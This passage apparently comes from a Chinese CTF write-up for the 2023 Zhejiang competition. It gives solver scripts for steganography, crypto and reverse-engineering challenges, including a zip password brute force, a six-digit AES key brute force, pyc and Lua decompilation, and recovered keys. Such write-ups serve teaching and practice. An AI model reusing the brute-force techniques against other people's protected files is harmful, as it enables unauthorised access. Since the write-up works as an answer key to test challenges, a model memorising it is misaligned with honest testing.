class="hljs-string">&#x27;wb&#x27;</span>)<br>d=f.read()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:<br>    n=(i//<span class="hljs-number">16</span>)+((i&amp;<span class="hljs-number">0xf</span>)&lt;&lt;<span class="hljs-number">4</span>)<br>    f1.write(<span class="hljs-built_in">bytes</span>([n]))<br></code></pre></td></tr></table></figure><p>steghide空密码解密得到flag.txt</p><p><img src="/img/wp/2023/2023zhejiang-6.png"></p><p>将<code>DASH</code>替换成<code>-</code>，<code>DOT</code>替换成<code>.</code>后解摩斯</p><p><img src="/img/wp/2023/2023zhejiang-7.png"></p><h2 id="初赛-Steins-Gate"><a href="#初赛-Steins-Gate" class="headerlink" title="初赛[Steins_Gate]"></a>初赛[Steins_Gate]</h2><p>给了一张很大的图片，由<code>嘟嘟噜</code>组成一张图片，观察发现每个字是<code>16*16</code></p><p>猜测是把原图像素替换成文字了</p><p>在每个字中找一个固定的像素点，然后提取像素还原原图</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;Steins_Gate.png&#x27;</span>)<br>width,height=img.size<br><br>new_img = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>, (<span class="hljs-built_in">int</span>(width / <span class="hljs-number">16</span>), <span class="hljs-built_in">int</span>(height / <span class="hljs-number">16</span>)))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>,height,<span class="hljs-number">16</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,width,<span class="hljs-number">16</span>):<br>        tmp = img.getpixel((j,i))<br>        <span class="hljs-built_in">print</span>(tmp)<br>        new_img.putpixel((<span class="hljs-built_in">int</span>(j / <span class="hljs-number">16</span>), <span class="hljs-built_in">int</span>(i / <span class="hljs-number">16</span>)), (tmp[<span class="hljs-number">0</span>], tmp[<span class="hljs-number">1</span>], tmp[<span class="hljs-number">2</span>]))<br><br>new_img.show()<br>new_img.save(<span class="hljs-string">&#x27;out.png&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/wp/2023/2023zhejiang-8.png"></p><p>使用stegsolve发现0通道有很多base64</p><p><img src="/img/wp/2023/2023zhejiang-9.png"></p><p>提取出来后发现每组后还有12个字节的冗余数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f1:<br>        data=f.read()<br>        i=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">while</span> i&lt;<span class="hljs-built_in">len</span>(data):<br>            f1.write(data[i:i+<span class="hljs-number">240</span>]+<span class="hljs-string">b&quot;\n&quot;</span>)<br>            i+=<span class="hljs-number">252</span><br></code></pre></td></tr></table></figure><p>去除冗余数据后base64解出一张图片</p><p><img src="/img/wp/2023/2023zhejiang-10.png"></p><p>同时也是多行base64的形式，尝试base64隐写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment">#base64解码脚本，Python2 运行</span><br><br>b64chars = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    bin_str = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f.readlines():<br>        stegb64 = <span class="hljs-string">&#x27;&#x27;</span>.join(line.split())<br>        rowb64 =  <span class="hljs-string">&#x27;&#x27;</span>.join(stegb64.decode(<span class="hljs-string">&#x27;base64&#x27;</span>).encode(<span class="hljs-string">&#x27;base64&#x27;</span>).split())<br>        offset = <span class="hljs-built_in">abs</span>(b64chars.index(stegb64.replace(<span class="hljs-string">&#x27;=&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)[-<span class="hljs-number">1</span>])-b64chars.index(rowb64.replace(<span class="hljs-string">&#x27;=&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)[-<span class="hljs-number">1</span>]))<br>        equalnum = stegb64.count(<span class="hljs-string">&#x27;=&#x27;</span>)<br>        <span class="hljs-keyword">if</span> equalnum:<br>            bin_str += <span class="hljs-built_in">bin</span>(offset)[<span class="hljs-number">2</span>:].zfill(equalnum * <span class="hljs-number">2</span>)<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(bin_str[i:i + <span class="hljs-number">8</span>], <span class="hljs-number">2</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(bin_str), <span class="hljs-number">8</span>)])<br></code></pre></td></tr></table></figure><p>得到密码<code>DuDuLu~T0_Ch3@t_THe_w0r1d</code></p><p>outguess解密得到flag</p><p><img src="/img/wp/2023/2023zhejiang-11.png"></p><h2 id="决赛-Xcode-v5-8"><a href="#决赛-Xcode-v5-8" class="headerlink" title="决赛[Xcode v5.8]"></a>决赛[Xcode v5.8]</h2><p>xxencode-&gt;base58</p><p><img src="/img/wp/2023/2023zhejiang-12.png"></p><h2 id="决赛-Ez-Signin"><a href="#决赛-Ez-Signin" class="headerlink" title="决赛[Ez_Signin]"></a>决赛[Ez_Signin]</h2><p>zip爆破密码，得到<code>11452</code></p><p>base32解密后得到一个文本</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs text">MoveTo 495, 314<br>KeyUp &quot;CapsLock&quot;, 1<br>LeftClick 1<br>LeftDown 1<br>MoveTo 495, 313<br>MoveTo 495, 312<br>MoveTo 494, 312<br>MoveTo 494, 311<br>MoveTo 493, 311<br>Delay 1<br>...<br>省略<br>...<br>MouseWheel 1<br>Delay 1<br>MouseWheel 1<br>MouseWheel 1<br>MouseWheel 1<br>MouseWheel 1<br>MouseWheel 1<br>KeyDown &quot;CapsLock&quot;, 1<br></code></pre></td></tr></table></figure><p>根据文本内容进行画图</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>a=Image.new(<span class="hljs-string">&quot;1&quot;</span>,(<span class="hljs-number">2000</span>,<span class="hljs-number">2000</span>))<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>)<br>d=f.read().splitlines()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;MoveTo&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> i:<br>        <span class="hljs-keyword">continue</span><br>    i=i[<span class="hljs-number">6</span>:].split(<span class="hljs-string">&#x27;,&#x27;</span>)<br>    x=<span class="hljs-built_in">int</span>(i[<span class="hljs-number">0</span>])<br>    y=<span class="hljs-built_in">int</span>(i[<span class="hljs-number">1</span>])<br>    a.putpixel((x,y),<span class="hljs-number">255</span>)<br>a.save(<span class="hljs-string">&quot;1.png&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/wp/2023/2023zhejiang-13.png"></p><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="初赛-小小数学家"><a href="#初赛-小小数学家" class="headerlink" title="初赛[小小数学家]"></a>初赛[小小数学家]</h2><p>计算式子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[]<br>a.append(<span class="hljs-number">19</span>+<span class="hljs-number">49</span>)<br>a.append(<span class="hljs-number">96</span>-<span class="hljs-number">31</span>)<br>a.append(<span class="hljs-number">86</span>-<span class="hljs-number">3</span>)<br>a.append(<span class="hljs-number">20</span>+<span class="hljs-number">47</span>)<br>a.append(<span class="hljs-number">29</span>+<span class="hljs-number">55</span>)<br>a.append(<span class="hljs-number">35</span>+<span class="hljs-number">35</span>)<br>a.append(<span class="hljs-number">81</span>+<span class="hljs-number">42</span>)<br>a.append(<span class="hljs-number">73</span>-<span class="hljs-number">16</span>)<br>a.append(<span class="hljs-number">52</span>+<span class="hljs-number">48</span>)<br>a.append(<span class="hljs-number">0</span>+<span class="hljs-number">56</span>)<br>a.append(<span class="hljs-number">55</span>-<span class="hljs-number">6</span>)<br>a.append(<span class="hljs-number">69</span>-<span class="hljs-number">20</span>)<br>a.append(<span class="hljs-number">99</span>-<span class="hljs-number">48</span>)<br>a.append(<span class="hljs-number">100</span>-<span class="hljs-number">52</span>)<br>a.append(<span class="hljs-number">36</span>+<span class="hljs-number">13</span>)<br>a.append(<span class="hljs-number">32</span>+<span class="hljs-number">13</span>)<br>a.append(<span class="hljs-number">84</span>-<span class="hljs-number">34</span>)<br>a.append(<span class="hljs-number">90</span>-<span class="hljs-number">34</span>)<br>a.append(<span class="hljs-number">94</span>-<span class="hljs-number">45</span>)<br>a.append(<span class="hljs-number">85</span>+<span class="hljs-number">13</span>)<br>a.append(<span class="hljs-number">50</span>-<span class="hljs-number">5</span>)<br>a.append(<span class="hljs-number">55</span>-<span class="hljs-number">3</span>)<br>a.append(<span class="hljs-number">77</span>+<span class="hljs-number">25</span>)<br>a.append(<span class="hljs-number">87</span>-<span class="hljs-number">35</span>)<br>a.append(<span class="hljs-number">62</span>+<span class="hljs-number">35</span>)<br>a.append(<span class="hljs-number">88</span>-<span class="hljs-number">43</span>)<br>a.append(<span class="hljs-number">86</span>-<span class="hljs-number">30</span>)<br>a.append(<span class="hljs-number">90</span>+<span class="hljs-number">10</span>)<br>a.append(<span class="hljs-number">66</span>-<span class="hljs-number">17</span>)<br>a.append(<span class="hljs-number">34</span>+<span class="hljs-number">63</span>)<br>a.append(<span class="hljs-number">51</span>-<span class="hljs-number">6</span>)<br>a.append(<span class="hljs-number">22</span>+<span class="hljs-number">76</span>)<br>a.append(<span class="hljs-number">46</span>+<span class="hljs-number">5</span>)<br>a.append(<span class="hljs-number">45</span>+<span class="hljs-number">11</span>)<br>a.append(<span class="hljs-number">20</span>+<span class="hljs-number">78</span>)<br>a.append(<span class="hljs-number">56</span>+<span class="hljs-number">45</span>)<br>a.append(<span class="hljs-number">99</span>//<span class="hljs-number">1</span>)<br>a.append(<span class="hljs-number">47</span>+<span class="hljs-number">52</span>)<br>a.append(<span class="hljs-number">58</span>+<span class="hljs-number">44</span>)<br>a.append(<span class="hljs-number">76</span>-<span class="hljs-number">26</span>)<br>a.append(<span class="hljs-number">92</span>-<span class="hljs-number">42</span>)<br>a.append(<span class="hljs-number">12</span>+<span class="hljs-number">44</span>)<br>a.append(<span class="hljs-number">80</span>-<span class="hljs-number">27</span>)<br>a.append(<span class="hljs-number">5</span>*<span class="hljs-number">25</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(a))<br></code></pre></td></tr></table></figure><h2 id="初赛-An-EaSy-Cipher"><a href="#初赛-An-EaSy-Cipher" class="headerlink" title="初赛[An EaSy Cipher]"></a>初赛[An EaSy Cipher]</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">[&quot;Kln/qZwlOsux+b/Gv0WsxkOec5E70dNhvczSLFs+0pkHaovEOBqUApBGBDBUrH08。RUNCIDAgMTI4IHNpeCBudW1iZXJz&quot;,&quot;Kln/qZwlOsux+b/Gv0WsxkOec5E70dNhvczSLFs+0pkHaovEOBqUApBGBDBUrH08&quot;]<br></code></pre></td></tr></table></figure><p>提示：<code>ECB 0 128 six numbers</code></p><p>写脚本爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">c=<span class="hljs-string">&quot;Kln/qZwlOsux+b/Gv0WsxkOec5E70dNhvczSLFs+0pkHaovEOBqUApBGBDBUrH08&quot;</span><br>key=<span class="hljs-string">&quot;RUNCIDAgMTI4IHNpeCBudW1iZXJz&quot;</span><br><br><span class="hljs-comment">#mcrypt是自定义的模块，包含aes</span><br><span class="hljs-keyword">from</span> mcrypt.boom <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> mcrypt.base <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> mcrypt.aes <span class="hljs-keyword">import</span> *<br>base=<span class="hljs-string">&quot;0123456789&quot;</span><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;data.txt&quot;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> Gendic(base,<span class="hljs-number">6</span>,<span class="hljs-literal">True</span>):<br>    a=aes(<span class="hljs-string">&#x27;&#x27;</span>.join(i),Pad_type=<span class="hljs-number">1</span>)<br>    data=a.decrypt(b64().decode(c))<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">print</span>(data.decode(<span class="hljs-string">&quot;utf-8&quot;</span>),i)<br>        f.write(data)<br>        f.write(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>        f.flush()<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><p><img src="/img/wp/2023/2023zhejiang-14.png"></p><h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="初赛-pyccc"><a href="#初赛-pyccc" class="headerlink" title="初赛[pyccc]"></a>初赛[pyccc]</h2><p>使用pycdc反编译</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Source Generated with Decompyle++</span><br><span class="hljs-comment"># File: baby.pyc (Python 3.8)</span><br><br>a = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;please input your flag:\n&#x27;</span>)<br>check = [<br>    <span class="hljs-number">102</span>,<br>    <span class="hljs-number">109</span>,<br>    <span class="hljs-number">99</span>,<br>    <span class="hljs-number">100</span>,<br>    <span class="hljs-number">127</span>,<br>    <span class="hljs-number">52</span>,<br>    <span class="hljs-number">114</span>,<br>    <span class="hljs-number">88</span>,<br>    <span class="hljs-number">97</span>,<br>    <span class="hljs-number">122</span>,<br>    <span class="hljs-number">85</span>,<br>    <span class="hljs-number">125</span>,<br>    <span class="hljs-number">105</span>,<br>    <span class="hljs-number">127</span>,<br>    <span class="hljs-number">119</span>,<br>    <span class="hljs-number">80</span>,<br>    <span class="hljs-number">120</span>,<br>    <span class="hljs-number">112</span>,<br>    <span class="hljs-number">98</span>,<br>    <span class="hljs-number">39</span>,<br>    <span class="hljs-number">109</span>,<br>    <span class="hljs-number">52</span>,<br>    <span class="hljs-number">55</span>,<br>    <span class="hljs-number">106</span>]<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a) == <span class="hljs-number">24</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>        <span class="hljs-keyword">if</span> check[i] == <span class="hljs-built_in">ord</span>(a[i]) ^ i:<br>            <span class="hljs-keyword">continue</span><br>            <span class="hljs-built_in">print</span>(yes)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;nononono&#x27;</span>)<br>    <span class="hljs-keyword">continue</span><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;nononono&#x27;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python">check = [<br>    <span class="hljs-number">102</span>,<br>    <span class="hljs-number">109</span>,<br>    <span class="hljs-number">99</span>,<br>    <span class="hljs-number">100</span>,<br>    <span class="hljs-number">127</span>,<br>    <span class="hljs-number">52</span>,<br>    <span class="hljs-number">114</span>,<br>    <span class="hljs-number">88</span>,<br>    <span class="hljs-number">97</span>,<br>    <span class="hljs-number">122</span>,<br>    <span class="hljs-number">85</span>,<br>    <span class="hljs-number">125</span>,<br>    <span class="hljs-number">105</span>,<br>    <span class="hljs-number">127</span>,<br>    <span class="hljs-number">119</span>,<br>    <span class="hljs-number">80</span>,<br>    <span class="hljs-number">120</span>,<br>    <span class="hljs-number">112</span>,<br>    <span class="hljs-number">98</span>,<br>    <span class="hljs-number">39</span>,<br>    <span class="hljs-number">109</span>,<br>    <span class="hljs-number">52</span>,<br>    <span class="hljs-number">55</span>,<br>    <span class="hljs-number">106</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(check)):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(check[i] ^ i), end=<span class="hljs-string">&quot;&quot;</span>)<br><br></code></pre></td></tr></table></figure><h2 id="初赛-easyapk"><a href="#初赛-easyapk" class="headerlink" title="初赛[easyapk]"></a>初赛[easyapk]</h2><p>密文是<code>HPjVMiy4FxSPc1n0eq52t4jaZ7FNr/qvJMjkusqbG6t8IVzztqflA0VQmVZYgiaC</code>，iv是<code>0123456789ABCDEF</code></p><p><img src="/img/wp/2023/2023zhejiang-15.png"></p><p>密钥中e替换成3</p><p><code>final String replaceAll = &quot;reversecarefully&quot;.replaceAll(&quot;e&quot;, &quot;3&quot;);</code></p><p>加密模式是AES</p><p><img src="/img/wp/2023/2023zhejiang-16.png"></p><p><img src="/img/wp/2023/2023zhejiang-17.png"></p><h2 id="初赛-luare"><a href="#初赛-luare" class="headerlink" title="初赛[luare]"></a>初赛[luare]</h2><p>先导出lua的字节码</p><p><img src="/img/wp/2023/2023zhejiang-18.png"></p><p>修补文件头为<code>1B 4C 7561 52</code>，其中52是版本号</p><p><img src="/img/wp/2023/2023zhejiang-19.png"></p><p>使用unluac反编译</p><p><code>java -jar unluac.jar out &gt; out.lua</code></p><p>得到</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">CheckAns</span><span class="hljs-params">(data)</span></span><br>  <span class="hljs-keyword">if</span> #data ~= <span class="hljs-number">40</span> <span class="hljs-keyword">then</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>  <span class="hljs-keyword">end</span><br>  dataOut = Oo00Oo0(data)<br>  enc = &#123;<br>    <span class="hljs-number">109</span>,<br>    <span class="hljs-number">-73</span>,<br>    <span class="hljs-number">-72</span>,<br>    <span class="hljs-number">46</span>,<br>    <span class="hljs-number">-73</span>,<br>    <span class="hljs-number">-5</span>,<br>    <span class="hljs-number">99</span>,<br>    <span class="hljs-number">-100</span>,<br>    <span class="hljs-number">46</span>,<br>    <span class="hljs-number">59</span>,<br>    <span class="hljs-number">32</span>,<br>    <span class="hljs-number">-76</span>,<br>    <span class="hljs-number">109</span>,<br>    <span class="hljs-number">3</span>,<br>    <span class="hljs-number">59</span>,<br>    <span class="hljs-number">20</span>,<br>    <span class="hljs-number">-61</span>,<br>    <span class="hljs-number">-56</span>,<br>    <span class="hljs-number">-119</span>,<br>    <span class="hljs-number">48</span>,<br>    <span class="hljs-number">100</span>,<br>    <span class="hljs-number">118</span>,<br>    <span class="hljs-number">36</span>,<br>    <span class="hljs-number">118</span>,<br>    <span class="hljs-number">82</span>,<br>    <span class="hljs-number">3</span>,<br>    <span class="hljs-number">95</span>,<br>    <span class="hljs-number">106</span>,<br>    <span class="hljs-number">14</span>,<br>    <span class="hljs-number">-80</span>,<br>    <span class="hljs-number">5</span>,<br>    <span class="hljs-number">-89</span>,<br>    <span class="hljs-number">89</span>,<br>    <span class="hljs-number">-85</span>,<br>    <span class="hljs-number">5</span>,<br>    <span class="hljs-number">14</span>,<br>    <span class="hljs-number">46</span>,<br>    <span class="hljs-number">-73</span>,<br>    <span class="hljs-number">7</span>,<br>    <span class="hljs-number">127</span><br>  &#125;<br>  i = <span class="hljs-number">1</span><br>  <span class="hljs-keyword">while</span> i &lt;= #dataOut <span class="hljs-keyword">do</span><br>    <span class="hljs-keyword">if</span> dataOut[i] ~= enc[i] <span class="hljs-keyword">then</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>    <span class="hljs-keyword">end</span><br>    i = i + <span class="hljs-number">1</span><br>  <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br><span class="hljs-keyword">end</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;input: &quot;</span>)<br><span class="hljs-keyword">local</span> data = <span class="hljs-built_in">io</span>.<span class="hljs-built_in">read</span>()<br><span class="hljs-keyword">if</span> CheckAns(data) <span class="hljs-keyword">then</span><br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;true&quot;</span>)<br><span class="hljs-keyword">else</span><br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;false&quot;</span>)<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>分析<code>Oo00Oo0</code>函数，简单异或</p><p><img src="/img/wp/2023/2023zhejiang-20.png"></p><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">v7=[<span class="hljs-number">0</span>]*<span class="hljs-number">32</span><br>v7= [<span class="hljs-number">0x60856D1028C8953C</span>,<span class="hljs-number">0x964849764CB30359</span>,<span class="hljs-number">0x2E7164C479B75FB8</span>,<span class="hljs-number">0x80637291A7AC8C38</span>,<span class="hljs-number">0x7B8BF3AE4B339EB0</span>,\<br>    <span class="hljs-number">0xCFE06FEC52B45B4D</span>,<span class="hljs-number">0x5DC67EAAB20C3AD</span>,<span class="hljs-number">0x24FCFBD656409F00</span>,<span class="hljs-number">0x4AF00D463D0BCA92</span>,<span class="hljs-number">0x7DBC8A3B1A11555A</span>,<span class="hljs-number">0x3061CE7513A9E76C</span>,\<br>    <span class="hljs-number">0x9C54D007276AA614</span>,<span class="hljs-number">0x34C20158D8898E5C</span>,<span class="hljs-number">0x50A02AC02F3569E8</span>,<span class="hljs-number">0xC0E681D39FF8836</span>,<span class="hljs-number">0xB66E7F18FEB1E693</span>,\<br>    <span class="hljs-number">0x29F5D2E92B315378</span>,<span class="hljs-number">0x41D9DBDE84172C0F</span>,<span class="hljs-number">0x7A45A899A1F71906</span>,<span class="hljs-number">0xE5AA0AAF1BA5233E</span>,<span class="hljs-number">0x9A3A82FAF8E1A4EF</span>,\<br>    <span class="hljs-number">0xC1D173C7651C8FDF</span>,<span 